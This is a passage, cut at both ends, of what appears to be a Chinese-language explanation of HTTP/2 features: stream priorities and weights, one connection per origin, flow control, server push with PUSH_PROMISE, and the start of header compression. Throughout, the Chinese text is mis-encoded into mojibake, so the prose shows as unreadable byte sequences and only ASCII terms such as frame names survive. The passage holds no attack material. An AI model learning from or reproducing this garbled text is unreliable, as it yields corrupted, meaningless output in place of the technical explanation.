é˜Ÿé¦–é˜»å¡é—®é¢˜ï¼Œä¹Ÿæ¶ˆé™¤äº†å¹¶è¡Œå¤„ç†å’Œå‘é€è¯·æ±‚å’Œå“åº”æ—¶å¯¹å¤šä¸ªè¿æ¥çš„ä¾èµ–ï¼ˆè¦å¼€å¤šä¸ª TCP è¿æ¥ï¼‰ã€‚ç»“æœåº”ç”¨é€Ÿåº¦æ›´å¿«ã€å¼€å‘æ›´ç®€å•ã€éƒ¨ç½²æˆæœ¬æ›´ä½ã€‚ æ•°æ®æµä¼˜å…ˆçº§ å°† HTTP æ¶ˆæ¯åˆ†è§£ä¸ºå¾ˆå¤šç‹¬ç«‹çš„å¸§åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤ç”¨å¤šä¸ªæ•°æ®æµä¸­çš„å¸§ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº¤é”™å‘é€å’Œä¼ è¾“è¿™äº›å¸§çš„é¡ºåºå°±æˆä¸ºå…³é”®çš„æ€§èƒ½å†³å®šå› ç´ ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼ŒHTTP/2 æ ‡å‡†å…è®¸æ¯ä¸ªæ•°æ®æµéƒ½æœ‰ä¸€ä¸ªå…³è”çš„æƒé‡å’Œä¾èµ–å…³ç³»ï¼š å¯ä»¥å‘æ¯ä¸ªæ•°æ®åˆ†é…ä¸€ä¸ªä»‹äº 1 - 256 ä¹‹é—´çš„æ•´æ•° æ¯ä¸ªæ•°æ®æµå’Œå…¶ä»–æ•°æ®æµä¹‹é—´å¯ä»¥å­˜åœ¨æ˜¾ç¤ºä¾èµ–å…³ç³» æ•°æ®æµä¾èµ–å…³ç³»å’Œæƒé‡çš„ç»„åˆè®©å®¢æˆ·ç«¯å¯ä»¥ä¼ é€’å’Œæ„å»ºä¼˜å…ˆçº§æ ‘ï¼Œè¡¨æ˜å®ƒå€¾å‘äºå¦‚ä½•æ¥å—å“åº”ã€‚åè¿‡æ¥ï¼ŒæœåŠ¡å™¨å¯ä»¥ä½¿ç”¨æ­¤ä¿¡æ¯é€šè¿‡æ§åˆ¶ CPUã€å†…å­˜å’Œå…¶ä»–èµ„æºçš„åˆ†é…è®¾å®šæ•°æ®æµå¤„ç†çš„ä¼˜å…ˆçº§ï¼Œåœ¨èµ„æºæ•°æ®å¯ç”¨ä¹‹åï¼Œå¸¦å®½åˆ†é…å¯ä»¥ç¡®ä¿å°†é«˜ä¼˜å…ˆçº§å“åº”ä»¥æœ€ä¼˜çš„æ–¹å¼ä¼ è¾“è‡³å®¢æˆ·ç«¯ã€‚ HTTP/2 å†…çš„æ•°æ®æµä¾èµ–å…³ç³»é€šè¿‡å°†å¦ä¸€ä¸ªæ•°æ®æµçš„å”¯ä¸€æ ‡è¯†ç¬¦ä½œä¸ºçˆ¶é¡¹å¼•ç”¨è¿›è¡Œå£°æ˜ï¼›å¦‚æœå¿½ç•¥æ ‡è¯†ç¬¦ï¼Œç›¸åº”æ•°æ®æµå°†ä¾èµ–äºâ€œæ ¹æ•°æ®æµâ€ã€‚å£°æ˜æ•°æ®æµä¾èµ–å…³ç³»æŒ‡å‡ºï¼Œåº”å°½å¯èƒ½å‘çˆ¶æ•°æ®æµåˆ†é…èµ„æºï¼Œç„¶åå†å‘å…¶ä»–ä¾èµ–é¡¹åˆ†é…èµ„æºã€‚æ¢å¥è¯è¯´ï¼Œâ€œè¯·å…ˆå¤„ç†å’Œä¼ è¾“å“åº” Dï¼Œç„¶åå†å¤„ç†å’Œä¼ è¾“å“åº” Câ€ã€‚ å…±äº«ç›¸åŒçˆ¶é¡¹çš„æ•°æ®æµï¼ˆå³ï¼ŒåŒçº§æ•°æ®æµï¼‰åº”æŒ‰ç…§å…¶æƒé‡åˆ†é…èµ„æºã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ•°æ®æµ A çš„æƒé‡ä¸º 12ï¼Œå…¶åŒçº§æ•°æ®æµ B çš„æƒé‡ä¸º 4ï¼Œé‚£ä¹ˆè¦ç¡®å®šæ¯ä¸ªæ•°æ®æµåº”æ¥å—èµ„æºçš„æ¯”åˆ—ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š å°†æ‰€æœ‰æƒé‡æ±‚å’Œï¼š4 + 12 = 16 å°†æ¯ä¸ªæ•°æ®æµæƒé‡é™¤ä»¥æ€»æƒé‡ï¼šA = 12 / 16ï¼ŒB = 4 / 16ï¼Œå› æ­¤ï¼Œæ•°æ®æµ A åº”è¯¥è·å¾—å¾—å››åˆ†ä¹‹ä¸‰çš„å¯ç”¨èµ„æºï¼Œæ•°æ®æµ B åº”è·å¾—å››åˆ†ä¹‹ä¸€çš„å¯ç”¨èµ„æºï¼›æ•°æ®æµ B è·å¾—çš„èµ„æºæ˜¯æ•°æ®æµ A æ‰€è·å¾—èµ„æºçš„ä¸‰åˆ†ä¹‹ä¸€ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸Šå›¾ä¸­å…¶ä»–å‡ ä¸ªåŠ¨æ‰‹ç¤ºä¾‹ï¼šé¡ºåºä»å·¦åˆ°å³ï¼š æ•°æ®æµ A å’Œæ•°æ®æµ B éƒ½æ²¡æœ‰åˆ¶å®šçˆ¶ä¾èµ–é¡¹ï¼Œä¾èµ–äºæ˜¾ç¤ºâ€œæ ¹æ•°æ®æµâ€ï¼›A çš„æƒé‡ä¸º 12ï¼ŒB çš„æƒé‡ä¸º 4ã€‚å› æ­¤ï¼Œæ ¹æ®æ¯”ä¾‹æƒé‡ï¼šæ•°æ®æµ B è·å¾—çš„èµ„æºæ•°æ®æµæ˜¯ A æ‰€è·èµ„æºçš„ä¸‰åˆ†ä¹‹ä¸€ æ•°æ®æµ D ä¾èµ–äºæ ¹æ•°æ®æµï¼›C ä¾èµ–äº Dã€‚å› æ­¤ï¼ŒD åº”å…ˆäº C è·å¾—å®Œæ•´çš„èµ„æºåˆ†é…ã€‚æƒé‡ä¸é‡è¦ï¼Œå› ä¸º C çš„ä¾èµ–å…³ç³»æ‹¥æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ æ•°æ®æµ D åº”ä¼˜å…ˆäº C è·å¾—å®Œæ•´èµ„æºåˆ†é…ï¼›C åº”ä¼˜å…ˆäº A å’Œ B è·å¾—å®Œæ•´çš„èµ„æºåˆ†é…ï¼›æ•°æ®æµ B è·å¾—çš„èµ„æºæ˜¯ A æ‰€è·èµ„æºçš„ä¸‰åˆ†ä¹‹ä¸€ æ•°æ®æµ D åº”ä¼˜å…ˆäº C å’Œ E è·å¾—å®Œæ•´çš„èµ„æºåˆ†é…ï¼›E å’Œ C åº”ä¼˜å…ˆäº A å’Œ B è·å¾—ç›¸ç­‰çš„èµ„æºåˆ†é…ï¼›A å’Œ B åº”åŸºäºå…¶æƒé‡è·å¾—æ¯”ä¾‹åˆ†é…ã€‚ å¦‚ä¸Šé¢ç¤ºä¾‹æ‰€ç¤ºï¼Œæ•°æ®æµä¾èµ–å…³ç³»å’Œæƒé‡çš„ç»„åˆæ˜ç¡®è¡¨è¾¾äº†èµ„æºä¼˜å…ˆçº§ï¼Œè¿™æ˜¯ä¸€ç§ç”¨äºæå‡æµè§ˆå™¨æ€§èƒ½çš„å…³é”®åŠŸèƒ½ï¼Œç½‘ç»œä¸­æ‹¥æœ‰å¤šç§èµ„æºç±»å‹ï¼Œå®ƒä»¬çš„ä¾èµ–å…³ç³»å’Œæƒé‡å„ä¸ç›¸åŒã€‚ä¸ä»…å¦‚æ­¤ï¼ŒHTTP/2 åè®®è¿˜å…è®¸å®¢æˆ·ç«¯éšæ—¶æ›´æ–°è¿™äº›ä¼˜å…ˆçº§ï¼Œè¿›ä¸€æ­¥ä¼˜åŒ–äº†æµè§ˆå™¨æ€§èƒ½ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç”¨æˆ·äº’åŠ¨å’Œå…¶ä»–ä¿¡å·æ›´æ”¹ä¾èµ–å…³ç³»å’Œé‡æ–°åˆ†é…æƒé‡ã€‚ æ³¨ï¼šæ•°æ®æµä¾èµ–å…³ç³»å’Œæƒé‡è¡¨ç¤ºä¼ è¾“ä¼˜å…ˆçº§ï¼Œè€Œä¸æ˜¯è¦æ±‚ï¼Œå› æ­¤ä¸èƒ½ä¿è¯ç‰¹å®šçš„å¤„ç†æˆ–ä¼ è¾“é¡ºåºã€‚å³ï¼Œå®¢æˆ·ç«¯æ— æ³•å¼ºåˆ¶æœåŠ¡å™¨é€šè¿‡æ•°æ®æµä¼˜å…ˆçº§ä»¥ç‰¹å®šé¡ºåºå¤„ç†æ•°æ®æµã€‚å°½ç®¡è¿™çœ‹èµ·æ¥è¿åç›´è§‰ï¼Œä½†å´æ˜¯ä¸€ç§å¿…è¦è¡Œä¸ºã€‚æˆ‘ä»¬ä¸å¸Œæœ›ä¼˜å…ˆçº§è¾ƒé«˜çš„èµ„æºæ”¶åˆ°é˜»å¡æ—¶ï¼Œè¿˜é˜»æ­¢æœåŠ¡å™¨å¤„ç†ä¼˜å…ˆçº§è¾ƒä½çš„èµ„æºã€‚ æ¯ä¸ªæ¥æºä¸€ä¸ªè¿æ¥ æœ‰äº†æ–°çš„åˆ†å¸§æœºåˆ¶åï¼ŒHTTP/2 ä¸å†ä¾èµ–å¤šä¸ª TCP è¿æ¥å»å¹¶è¡Œå¤ç”¨æ•°æ®æµï¼›æ¯ä¸ªæ•°æ®æµéƒ½æ‹†åˆ†æˆå¾ˆå¤šå¸§ï¼Œè€Œè¿™äº›å¸§å¯ä»¥äº¤é”™ï¼Œè¿˜å¯ä»¥åˆ†åˆ«è®¾å®šä¼˜å…ˆçº§ã€‚å› æ­¤ï¼Œæ‰€æœ‰ HTTP/2 è¿æ¥éƒ½æ˜¯æ°¸ä¹…çš„ï¼Œè€Œä¸”ä»…éœ€è¦æ¯ä¸ªæ¥æºä¸€ä¸ªè¿æ¥ï¼Œéšä¹‹å¸¦æ¥è¯¸å¤šæ€§èƒ½ä¼˜åŠ¿ã€‚ SPDY å’Œ HTTP/2 çš„æ€æ‰‹çº§åŠŸèƒ½æ˜¯ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªæ‹¥å¡æ”¶åˆ°è‰¯å¥½æ§åˆ¶çš„é€šé“ä¸Šè¿›è¡Œä»»æ„å¤ç”¨ã€‚è¿™ä¸€åŠŸèƒ½çš„é‡è¦æ€§å’Œè‰¯å¥½è¿è¡ŒçŠ¶å†µè®©æˆ‘åƒæƒŠã€‚æˆ‘å–œæ¬¢çš„ä¸€ä¸ªéå¸¸ä¸é”™çš„æŒ‡æ ‡æ˜¯è¿æ¥æ‹†åˆ†ï¼Œè¿™äº›æ‹†åˆ†ä»…æ‰¿è½½ä¸€ä¸ª HTTP äº‹åŠ¡ï¼ˆå¹¶å› æ­¤è®©è¯¥äº‹ç‰©æ‰¿æ‹…æ‰€æœ‰å¼€é”€ï¼‰ã€‚å¯¹äº HTTP/1ï¼Œæˆ‘ä»¬ 74% çš„æ´»åŠ¨è¿æ¥ä»…æ‰¿è½½ä¸€ä¸ªäº‹åŠ¡-æ°¸ä¹…è¿æ¥å¹¶ä¸å¦‚æˆ‘ä»¬æ‰€æœ‰äººå¸Œæœ›çš„é‚£èˆ¬æœ‰ç”¨ã€‚ä½†æ˜¯åœ¨ HTTP/2 ä¸­ï¼Œè¿™ä¸€æ¯”ä¾‹é”å‡è‡³ 25%ï¼ˆHTTP/2 ç™»é™† Firefoxï¼ŒPatrick McManusï¼‰ å¤§å¤šæ•° HTTP è¿æ¥éƒ½æ˜¯çŸ­æš‚è€Œæ€¥ä¿ƒçš„ï¼Œè€Œ TCP åˆ™é’ˆå¯¹é•¿æ—¶é—´çš„æ‰¹é‡æ•°æ®ä¼ è¾“è¿›è¡Œäº†ä¼˜åŒ–ã€‚é€šè¿‡é‡ç”¨ç›¸åŒè¿æ¥ï¼ŒHTTP/2 æ—¢å¯ä»¥æ›´æœ‰æ•ˆçš„åˆ©ç”¨æ¯ä¸ª TCP è¿æ¥ï¼Œä¹Ÿå¯ä»¥æ˜¾è‘—é™ä½æ•´ä½“åè®®å¼€é”€ã€‚ä¸ä»…å¦‚æ­¤ï¼Œä½¿ç”¨æ›´å°‘çš„è¿æ¥è¿˜å¯ä»¥å‡å°‘å ç”¨çš„å†…å­˜å’Œå¤„ç†ç©ºé—´ï¼Œå¯ä»¥ç¼©çŸ­å®Œæ•´è¿æ¥è·¯å¾„ï¼ˆå³ï¼Œå®¢æˆ·ç«¯ã€å¯ä¿¡ä¸­ä»‹å’ŒæºæœåŠ¡å™¨ä¹‹é—´çš„è·¯å¾„ï¼‰è¿™é™ä½äº†æ•´ä½“è¿è¡Œæˆæœ¬å¹¶æé«˜äº†ç½‘ç»œåˆ©ç”¨ç‡å’Œå®¹é‡ã€‚å› æ­¤ï¼Œè¿ç§»åˆ° HTTP/2 ä¸ä»…å¯ä»¥å‡å°‘ç½‘ç»œå»¶è¿Ÿï¼Œè¿˜æœ‰åŠ©äºæé«˜é€šé‡å’Œè¿è¡Œæˆæœ¬ã€‚ æ³¨ï¼šè¿æ¥æ•°é‡çš„å‡å°‘å¯¹æå‡ HTTPS éƒ¨ç½²çš„æ€§èƒ½æ¥è¯´æ˜¯ä¸€é¡¹ç‰¹åˆ«é‡è¦çš„åŠŸèƒ½ï¼šå¯ä»¥å‡å°‘å¼€é”€è¾ƒå¤§çš„ TLS è¿æ¥ã€æå‡ä¼šè¯åˆ©ç”¨ç‡ï¼Œä»¥åŠæ•´ä½“ä¸Šå‡å°‘æ‰€éœ€çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨èµ„æºã€‚ æµæ§åˆ¶ æµæ§åˆ¶æ˜¯ä¸€ç§é˜»æ­¢å‘é€æ–¹å‘æ¥å—æ–¹å‘é€å¤§é‡æ•°æ®çš„æœºåˆ¶ï¼Œä»¥å…è¶…å‡ºåè€…çš„éœ€æ±‚æˆ–å¤„ç†èƒ½åŠ›ï¼šå‘é€æ–¹å¯èƒ½éå¸¸å¿™ã€å¤„äºè¾ƒé«˜è´Ÿè·ä¹‹ä¸‹ï¼Œä¹Ÿå¯èƒ½ä»…ä»…å¸Œæœ›ä¸ºç‰¹å®šçš„æ•°æ®æµåˆ†é…å›ºå®šé‡çš„èµ„æºã€‚ä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯å¯èƒ½è¯·æ±‚äº†ä¸€ä¸ªå…·æœ‰è¾ƒé«˜ä¼˜å…ˆçº§çš„è§†é¢‘æµï¼Œä½†æ˜¯ç”¨æˆ·å·²ç»æš‚åœè§†é¢‘ï¼Œå®¢æˆ·ç«¯å¸Œæœ›æš‚åœæˆ–è€…é™åˆ¶ä»æœåŠ¡å™¨çš„ä¼ è¾“ï¼Œä»¥å…æå–å’Œç¼“å†²ä¸å¿…è¦çš„æ•°æ®ã€‚å†æ¯”å¦‚ï¼Œä¸€ä¸ªä»£ç†æœåŠ¡å™¨å¯èƒ½å…·æœ‰è¾ƒå¿«çš„ä¸‹æ¸¸è¿æ¥å’Œè¾ƒæ…¢çš„ä¸Šæ¸¸è¿æ¥ï¼Œå¹¶ä¸”ä¹Ÿå¸Œæœ›è°ƒèŠ‚ä¸‹æ¸¸è¿æ¥ä¼ è¾“æ•°æ®çš„é€Ÿåº¦ä»¥åŒ¹é…ä¸Šæ¸¸è¿æ¥é€Ÿåº¦æ¥æ§åˆ¶å…¶èµ„æºåˆ©ç”¨ï¼Œç­‰ç­‰ã€‚ ä¸Šè¿°è¦æ±‚ä¼šè®©ä½ æƒ³åˆ° TCP çš„æµæ§åˆ¶å—ï¼Ÿæ‚¨åº”å½“æƒ³åˆ°è¿™ä¸€ç‚¹ï¼›å› ä¸ºé—®é¢˜åŸºæœ¬ç›¸åŒï¼ˆè¯·å‚é˜…æµæ§åˆ¶ï¼‰ã€‚ä¸è¿‡ï¼Œç”±äº HTTP/2 æ•°æ®æµåœ¨ä¸€ä¸ª TCP è¿æ¥å†…å¤ç”¨ï¼ŒTCP æµæ§åˆ¶æ—¢ä¸å¤Ÿç²¾ç»†ï¼Œä¹Ÿæ— æ³•æä¾›å¿…è¦çš„åº”ç”¨çº§ API æ¥è°ƒèŠ‚å„ä¸ªæ•°æ®æµçš„ä¼ è¾“ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œ HTTP/2 æä¾›äº†ä¸€ç»„ç®€å•çš„æ„å»ºå—ï¼Œè¿™äº›æ„å»ºå—å…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å®ç°è‡ªå·±çš„æ•°æ®æµå’Œè¿æ¥çº§æµæ§åˆ¶ï¼š æµæ§åˆ¶å…·æœ‰æ–¹å‘æ€§ã€‚æ¯ä¸ªæ¥å—æ–¹éƒ½å¯ä»¥æ ¹æ®è‡ªèº«éœ€è¦é€‰æ‹©ä¸ºæ¯ä¸ªæ•°æ®æµå’Œæ•´ä¸ªè¿æ¥è®¾ç½®ä»»æ„çš„çª—å£å¤§å°ã€‚ æµæ§åˆ¶åŸºäºä¿¡ç”¨ã€‚æ¯ä¸ªæ¥å—æ–¹éƒ½å¯ä»¥å…¬å¸ƒå…¶åˆå§‹è¿æ¥å’Œæ•°æ®æµæµæ§åˆ¶çª—å£ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œæ¯å½“å‘é€æ–¹å‘å‡º DATA å¸§æ—¶éƒ½ä¼šå‡å°ï¼Œåœ¨æ¥å—æ–¹å‘å‡º WINDOW_UPDATE å¸§æ—¶å¢å¤§ã€‚ æµæ§åˆ¶æ— æ³•åœç”¨ã€‚å»ºç«‹ HTTP/2 è¿æ¥åï¼Œå®¢æˆ·ç«¯å°†ä¸æœåŠ¡å™¨äº¤æ¢ SETTINGS å¸§ï¼Œè¿™ä¼šåœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šè®¾ç½®æµæ§åˆ¶çª—å£ã€‚æµæ§åˆ¶çª—å£çš„é»˜è®¤å€¼ä¸º 65535 å­—èŠ‚ï¼Œä½†æ˜¯æ¥å—æ–¹å¯ä»¥è®¾ç½®ä¸€ä¸ªè¾ƒå¤§çš„æœ€å¤§çª—å£å¤§å°ï¼ˆ2^31 - 1ï¼‰å¹¶åœ¨æ¥æ”¶åˆ°ä»»æ„æ•°æ®æ—¶é€šè¿‡å‘é€ WINDOW_UPDATE å¸§æ¥ç»´æŒè¿™ä¸€å¤§å°ã€‚ æµæ§åˆ¶ä¸ºé€è·ƒç‚¹æ§åˆ¶ï¼Œè€Œéç«¯åˆ°ç«¯æ§åˆ¶ã€‚å³ï¼Œå¯ä¿¡ä¸­ä»‹å¯ä»¥ä½¿ç”¨å®ƒæ¥æ§åˆ¶èµ„æºä½¿ç”¨ï¼Œä»¥åŠåŸºäºè‡ªèº«æ¡ä»¶å’Œå¯å‘å¼ç®—æ³•å®ç°èµ„æºçš„åˆ†é…æœºåˆ¶ã€‚ HTTP/2 æœªæŒ‡å®šä»»ä½•ç‰¹å®šçš„ç®—æ³•æ¥å®ç°æµæ§åˆ¶ã€‚ä¸è¿‡ï¼Œå®ƒæä¾›äº†ç®€å•çš„æ„å»ºå—å¹¶æ¨è¿Ÿäº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å®ç°ï¼Œå¯ä»¥å®ç°è‡ªå®šä¹‰ç­–ç•¥æ¥è°ƒèŠ‚èµ„æºçš„ä½¿ç”¨å’Œåˆ†é…ï¼Œä»¥åŠå®ç°æ–°çš„ä¼ è¾“èƒ½åŠ›ï¼ŒåŒæ—¶æå‡ç½‘ç»œåº”ç”¨çš„å®é™…æ€§èƒ½å’Œæ„ŸçŸ¥æ€§èƒ½ï¼ˆè¯·å‚é˜…é€Ÿåº¦ã€æ€§èƒ½å’Œäººç±»æ„ŸçŸ¥ï¼‰ã€‚ ä¾‹å¦‚ï¼Œåº”ç”¨å±‚æµæ§åˆ¶å…è®¸æµè§ˆå™¨ä»…æå–ä¸€éƒ¨åˆ†ç‰¹å®šçš„èµ„æºï¼Œé€šè¿‡å°†æ•°æ®æµæµæ§åˆ¶çª—å£å‡å°ä¸ºé›¶æ¥åœæ­¢æå–ï¼Œç¨åå†æ¢å¤ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå…è®¸æµè§ˆå™¨æå–å›¾åƒé¢„è§ˆæˆ–é¦–æ¬¡æ‰«æç»“æœï¼Œè¿›è¡Œæ˜¾ç¤ºå¹¶å…è®¸å…¶ä»–é«˜ä¼˜å…ˆçº§æå–ç»§ç»­ï¼Œç„¶ååœ¨æ›´å…³é”®çš„èµ„æºå®ŒæˆåŠ è½½åæ¢å¤æå–ã€‚ æœåŠ¡å™¨æ¨é€ HTTP/2 æ–°å¢çš„å¦å¤–ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½æ˜¯ï¼ŒæœåŠ¡å™¨å¯ä»¥å¯¹ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚å‘é€å¤šä¸ªå“åº”ã€‚æ¢å¥è¯è¯´ï¼Œé™¤äº†å¯¹æœ€åˆè¯·æ±‚çš„å“åº”å¤–ï¼ŒæœåŠ¡å™¨è¿˜å¯ä»¥å‘å®¢æˆ·ç«¯æ¨é€é¢å¤–çš„èµ„æºï¼Œå¦‚ä¸‹å›¾ï¼Œè€Œæ— éœ€å®¢æˆ·ç«¯æ˜ç¡®åœ°è¯·æ±‚ã€‚ æ³¨ï¼šHTTP/2 æ‰“ç ´äº†ä¸¥æ ¼çš„è¯·æ±‚å“åº”è¯­ä¹‰ï¼Œæ”¯æŒä¸€å¯¹å¤šå’ŒæœåŠ¡å™¨å‘èµ·çš„æ¨é€å·¥ä½œæµï¼Œåœ¨æµè§ˆå™¨å†…å¤–å¼€å¯äº†å…¨æ–°çš„äº’åŠ¨å¯èƒ½æ€§ã€‚è¿™æ˜¯ä¸€é¡¹ä½¿ç”¨åŠŸèƒ½ï¼Œå¯¹æˆ‘ä»¬æ€è€ƒåè®®ï¼Œåè®®ç”¨é€”å’Œä½¿ç”¨æ–¹å¼å…·æœ‰é‡è¦çš„é•¿æœŸå½±å“ã€‚ ä¸ºä»€ä¹ˆåœ¨æµè§ˆå™¨ä¸­éœ€è¦ä¸€ç§æ­¤ç±»æœºåˆ¶å‘¢ï¼Ÿä¸€ä¸ªå…¸å‹çš„ç½‘ç»œåº”ç”¨åŒ…å«å¤šç§èµ„æºï¼Œå®¢æˆ·ç«¯éœ€è¦æ£€æŸ¥æœåŠ¡å™¨æä¾›çš„æ–‡æ¡£æ‰èƒ½é€ä¸ªæ‰¾åˆ°å®ƒä»¬ã€‚é‚£ä¸ºä»€ä¹ˆä¸è®©æœåŠ¡å™¨æå‰æ¨é€è¿™äº›èµ„æºï¼Œä»è€Œå‡å°‘é¢å¤–çš„å»¶è¿Ÿæ—¶é—´å‘¢ï¼ŸæœåŠ¡å™¨å·²ç»çŸ¥é“å®¢æˆ·ç«¯ä¸‹ä¸€æ­¥éœ€è¦è¯·æ±‚ä»€ä¹ˆèµ„æºï¼Œè¿™æ—¶å€™æœåŠ¡å™¨æ¨é€å³å¯æ´¾ä¸Šç”¨åœºã€‚ äº‹å®ä¸Šï¼Œå¦‚æœä½ åœ¨ç½‘é¡µä¸­å†…è”è¿‡ CSSã€Javascriptï¼Œæˆ–è€…é€šè¿‡æ•°æ® URL å†…è”è¿‡å…¶ä»–èµ„äº§ï¼Œé‚£ä¹ˆæ‚¨å·²ç»äº²èº«ä½“éªŒè¿‡æœåŠ¡å™¨æ¨é€äº†ã€‚å¯¹äºå°†èµ„æºæ‰‹åŠ¨å†…è”åˆ°æ–‡æ¡£ä¸­çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å®é™…ä¸Šæ˜¯å°†èµ„æºæ¨é€ç»™å®¢æˆ·ç«¯ï¼Œè€Œä¸æ˜¯ç­‰å¾…å®¢æˆ·ç«¯è¯·æ±‚ã€‚ä½¿ç”¨ HTTP/2 ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥å®ç°ç›¸åŒç»“æœï¼Œè¿˜ä¼šè·å¾—å…¶ä»–æ€§èƒ½ä¼˜åŠ¿ã€‚æ¨é€èµ„æºå¯ä»¥è¿›è¡Œä»¥ä¸‹å¤„ç†ï¼š ç”±å®¢æˆ·ç«¯ç¼“å­˜ ä¸åŒé¢ä¹‹é—´é‡ç”¨ ä¸å…¶ä»–èµ„æºä¸€èµ·å¤ç”¨ ç”±æœåŠ¡å™¨è®¾å®šä¼˜å…ˆçº§ è¢«å®¢æˆ·ç«¯æ‹’ç» PUSH_PROMISE 101 æ‰€æœ‰æœåŠ¡å™¨æ¨é€æ•°æ®æµéƒ½ç”± PUSH_PROMISE å‘èµ·ï¼Œè¡¨æ˜äº†æœåŠ¡å™¨å‘å®¢æˆ·ç«¯æ¨é€æ‰€è¿°èµ„æºçš„æ„å›¾ï¼Œå¹¶ä¸”éœ€è¦å…ˆäºè¯·æ±‚æ¨é€èµ„æºçš„å“åº”æ•°æ®ä¼ è¾“ã€‚è¿™ç§ä¼ è¾“é¡ºåºéå¸¸é‡è¦ï¼šå®¢æˆ·ç«¯éœ€è¦äº†è§£æœåŠ¡å™¨æ‰“ç®—æ¨é€å“ªäº›èµ„æºï¼Œä»¥å…ä¸ºè¿™äº›èµ„æºåˆ›å»ºé‡å¤è¯·æ±‚ã€‚æ»¡è¶³è¦æ±‚çš„æœ€ç®€å•ç­–ç•¥æ˜¯å…ˆäºçˆ¶å“åº”ï¼ˆå³ï¼ŒDATA å¸§ï¼‰å‘é€æ‰€æœ‰ PUSH_PROMISE å¸§ï¼Œå…¶ä¸­åŒ…å«æ‰€æ‰¿è¯ºèµ„æºçš„ HTTP å¤´ã€‚ åœ¨å®¢æˆ·ç«¯æ”¶åˆ° PUSH_PROMISE å¸§åï¼Œå®ƒå°±å¯ä»¥æ ¹æ®è‡ªèº«æƒ…å†µé€‰æ‹©æ‹’ç»æ•°æ®æµï¼ˆé€šè¿‡ RST_STREAMå¸§ï¼‰ã€‚ï¼ˆå¦‚æœèµ„æºå·²ä½äºç¼“å­˜ä¸­ï¼Œå¯èƒ½ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼‰è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹äº HTTP/1.x çš„é‡è¦æå‡ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œä½¿ç”¨å†…è”ï¼ˆä¸€ç§å—æ¬¢è¿çš„ HTTP/1.x â€œä¼˜åŒ–â€ï¼‰ç­‰åŒäºâ€œå¼ºåˆ¶æ¨é€â€ï¼šå®¢æˆ·ç«¯æ— æ³•é€‰æ‹©æ‹’ç»ã€å–æ¶ˆæˆ–å•ç‹¬å¤„ç†å†…è”çš„èµ„æºã€‚ ä½¿ç”¨ HTTP/2ï¼Œå®¢æˆ·ç«¯ä»ç„¶å®Œå…¨æŒæ§æœåŠ¡å™¨æ¨é€çš„ä½¿ç”¨æ–¹å¼ã€‚å®¢æˆ·ç«¯å¯ä»¥é™åˆ¶å¹¶è¡Œæ¨é€çš„æ•°æ®æµæ•°é‡ï¼›è°ƒæ•´åˆå§‹çš„æµæ§åˆ¶çª—å£ä»¥æ§åˆ¶åœ¨æ•°æ®æµé¦–æ¬¡æ‰“å¼€æ—¶æ¨é€çš„æ•°æ®é‡ï¼›æˆ–å®Œå…¨åœç”¨æœåŠ¡å™¨æ¨é€ã€‚è¿™äº›ä¼˜å…ˆçº§åœ¨ HTTP/2 è¿æ¥å¼€å§‹æ—¶é€šè¿‡ SETINGS å¸§ä¼ è¾“ï¼Œå¯èƒ½éšæ—¶æ›´æ–°ã€‚ æ¨é€çš„æ¯ä¸ªèµ„æºéƒ½æ˜¯ä¸€ä¸ªæ•°æ®æµï¼Œä¸å†…è”èµ„æºä¸åŒï¼Œå®¢æˆ·ç«¯å¯ä»¥å¯¹æ¨é€èµ„æºé€ä¸€å¤ç”¨ã€è®¾å®šä¼˜å…ˆçº§å’Œå¤„ç†ã€‚æµè§ˆå™¨å¼ºåˆ¶æ‰§è¡Œçš„å”¯ä¸€å®‰å…¨æœºåˆ¶æ˜¯ï¼Œæ¨é€çš„èµ„æºå¿…é¡»ç¬¦åˆåŸç‚¹ç›¸åŒè¿™ä¸€æ”¿ç­–ï¼šæœåŠ¡å™¨å¯¹æ‰€æä¾›çš„èµ„æºå¿…é¡»æœ‰æƒå¨æ€§ã€‚ æ ‡å¤´å‹ç¼© æ¯ä¸ª HTTP ä¼ è¾“éƒ½æ‰¿è½½ä¸€ç»„æ ‡å¤´ï¼Œè¿™äº›æ ‡å¤´è¯´æ˜äº†ä¼ è¾“èµ„æºåŠå…¶å±æ€§ã€‚åœ¨ HTTP/1.x ä¸­ï¼Œæ­¤å…ƒæ•°æ®å§‹ç»ˆä»¥çº¯æ–‡æœ¬å½¢å¼ï¼Œé€šå¸¸ä¼šç»™æ¯ä¸ªä¼ è¾“å¢åŠ  500-800 å­—èŠ‚çš„å¼€é”€ã€‚å¦‚æœä½¿ç”¨ HTTP cookieï¼Œå¢åŠ çš„å¼€é”€æœ‰æ—¶ä¼šè¾¾ä¸Šåƒå­—èŠ‚ã€‚ä¸ºäº†å‡å°‘æ­¤å¼€é”€å’Œæå‡æ€§èƒ½ï¼ŒHTTP/2 ä½¿ç”¨ HPACK å‹ç¼©æ ¼å¼å‹ç¼©è¯·æ±‚å’Œå“åº”æ ‡å¤´å…ƒæ•°æ®ï¼Œè¿™ç§æ ¼å¼é‡‡ç”¨ä¸¤ç§ç®€å•ä½†æ˜¯å¼ºå¤§çš„æŠ€æœ¯ï¼š è¿™ç§æ 